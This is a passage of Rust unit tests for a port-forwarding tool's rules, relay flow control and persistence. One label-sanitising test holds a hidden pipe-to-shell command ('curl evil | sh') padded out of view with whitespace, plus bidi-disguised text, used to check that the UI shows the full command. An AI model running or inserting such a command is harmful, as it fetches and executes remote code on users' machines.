        let listening = rule(|r| (r.id, r.name, r.to_host, r.ports) = ("r3".into(), "other".into(), "pc".into(), vec![port(9222, 9222)]));
        assert_eq!(
            check(rule(|r| r.ports = vec![port(9222, 1)]), std::slice::from_ref(&listening)).unwrap_err(),
            "ports: dev box already listens on 9222 in forward \"other\""
        );
        assert_eq!(check(rule(|r| (r.from_host, r.to_host, r.ports) = ("pc".into(), "dev".into(), vec![port(9222, 1)])), &[listening]), Ok(()));
    }

    /// The relay holds both sides to the flow control: a sender past the receiver's window and a
    /// receiver that acknowledges more than was passed towards it are cut off (such an ack would
    /// open the other side's window for data nobody consumed); port streams see both ends' eof.
    #[test]
    fn the_relay_cuts_a_sender_past_the_window_and_a_receiver_acking_what_it_never_got() {
        // A data event of `n` zero bytes (base64: 3 bytes per "AAAA", the rest padded).
        let data = |n: usize| FwdEv::Data { data: format!("{}{}", "AAAA".repeat(n / 3), ["", "AA==", "AAA="][n % 3]), fd: 0 };
        let ack = |n: u64| FwdEv::Ack { n };
        let frames = (FWD_WINDOW / FWD_CHUNK as u64) as usize;
        let mut f = Flow::default();
        for _ in 0..frames {
            assert!(f.pass(true, &data(FWD_CHUNK)).is_ok(), "a whole window up");
        }
        assert!(f.pass(false, &ack(FWD_WINDOW)).is_ok(), "the to-host consumed it");
        for _ in 0..frames {
            assert!(f.pass(true, &data(FWD_CHUNK)).is_ok(), "the window again");
        }
        assert!(f.pass(true, &data(1)).is_err(), "one byte past the window");
        assert!(Flow::default().pass(false, &data(FWD_CHUNK + 1)).is_err(), "a frame larger than a chunk");

        let mut f = Flow::default();
        assert!(f.pass(false, &data(30)).is_ok());
        assert!(f.pass(true, &ack(30)).is_ok(), "the from-host acknowledges what came down");
        assert!(f.pass(true, &ack(1)).is_err(), "and never more");
        assert!(f.pass(false, &ack(1)).is_err(), "nor the to-host more than went up");

        let mut f = Flow::default();
        assert!(f.pass(true, &FwdEv::Eof).is_ok() && f.eof_up && !f.eof_down);
        assert!(f.pass(false, &FwdEv::Eof).is_ok() && f.eof_down);
    }

    /// What the UI lists is what runs: nothing hides behind whitespace, control or bidi characters.
    #[test]
    fn stream_labels_show_the_whole_command() {
        let hidden = format!("true{}; curl evil | sh", " ".repeat(300));
        assert_eq!(label_text(&hidden), "true ; curl evil | sh");
        assert_eq!(label_text("ls\t-la\n\x1b[2Jrm\u{202E}fdp.exe\u{2066}"), "ls -la [2Jrmfdp.exe");
        let long = label_text(&"x".repeat(500));
        assert!(long.chars().count() == LABEL_MAX && long.ends_with('…'));
    }

    struct NullPlatform;
    impl crate::platform::Platform for NullPlatform {
        fn notify(&self, _: Option<&HostProfile>, _: &tf_proto::Notification, _: crate::platform::NotifyStyle) {}
        fn open_external(&self, _: &str) -> Result<(), ApiError> {
            Ok(())
        }
        fn set_keep_alive(&self, _: bool) {}
        fn set_badge(&self, _: crate::platform::BadgeState) {}
        fn device_name(&self) -> String {
            "test-device".into()
        }
    }

    async fn engine(dir: &Path) -> crate::engine::Engine {
        let cfg = crate::engine::EngineConfig {
            data_dir: dir.to_path_buf(),
            platform_name: "linux".into(),
            client_app: "teleflock-test".into(),
            version: "0.0.0".into(),
            hostd_bins_override: None,
        };
        let (engine, _rx) = crate::engine::Engine::start(cfg, Arc::new(NullPlatform)).await;
        for h in [host("dev", "dev box"), host("mac", "Studio Mac")] {
            engine.call(None, "hosts.save", serde_json::to_value(h).unwrap()).await.unwrap();
        }
        engine
    }

    async fn call(engine: &crate::engine::Engine, method: &str, params: serde_json::Value) -> Result<ForwardList, ApiError> {
        engine.call(None, method, params).await.map(|v| serde_json::from_value(v).unwrap())
    }

    /// Through the app methods: a new rule gets an id, saving it again under that id is no
    /// duplicate, the rules live in `forwards.json` (a new core reads them), and `hosts.remove`
    /// drops the rules that name the host.
    #[tokio::test]
    async fn save_replace_persist_and_host_removal() {
        let dir = tempfile::tempdir().unwrap();
        let engine = engine(dir.path()).await;
        let save = |r: ForwardRule| serde_json::json!({ "rule": r });
        let saved = call(&engine, "forward.save", save(rule(|_| {}))).await.unwrap();
        let id = saved.rules[0].id.clone();
        assert!(id.starts_with("fw_"), "{id}");
        assert_eq!(saved.status[0].state, ForwardState::Waiting, "neither host is connected");
        let again = call(&engine, "forward.save", save(rule(|r| (r.id, r.tools) = (id.clone(), vec!["adb".into()])))).await.unwrap();
        assert_eq!((again.rules.len(), again.rules[0].tools.clone()), (1, vec!["adb".to_string()]));
        let off = call(&engine, "forward.save", save(rule(|r| (r.id, r.enabled) = (id.clone(), false)))).await.unwrap();
        assert_eq!(off.status[0].state, ForwardState::Disabled);
        let e = call(&engine, "forward.save", save(rule(|r| r.name = "Bad".into()))).await.unwrap_err();
        assert!(e.code == "invalid_params" && e.message.starts_with("name: "), "{e:?}");
        assert_eq!(call(&engine, "forward.remove", serde_json::json!({ "id": "nope" })).await.unwrap_err().code, "not_found");
        assert_eq!(call(&engine, "forward.stop", serde_json::json!({ "streamId": "fs9" })).await.unwrap_err().code, "not_found");
        call(&engine, "forward.save", save(rule(|r| r.name = "second".into()))).await.unwrap();
        engine.shutdown().await;

        let engine = super::tests::engine(dir.path()).await;
        let listed = call(&engine, "forward.list", serde_json::json!({})).await.unwrap();
        assert_eq!(listed.rules.len(), 2, "read back from forwards.json");
        assert_eq!(listed.rules[0].id, id);
        engine.call(None, "hosts.remove", serde_json::json!({ "hostId": "mac" })).await.unwrap();
        assert!(call(&engine, "forward.list", serde_json::json!({})).await.unwrap().rules.is_empty(), "rules naming the removed host go");
        let file: RulesFile = serde_json::from_slice(&std::fs::read(dir.path().join("forwards.json")).unwrap()).unwrap();
        assert!(file.rules.is_empty());
        let removed = call(&engine, "forward.save", save(rule(|_| {}))).await.unwrap_err();
        assert_eq!(removed.message, "toHost: no host mac");
        engine.shutdown().await;
    }
}
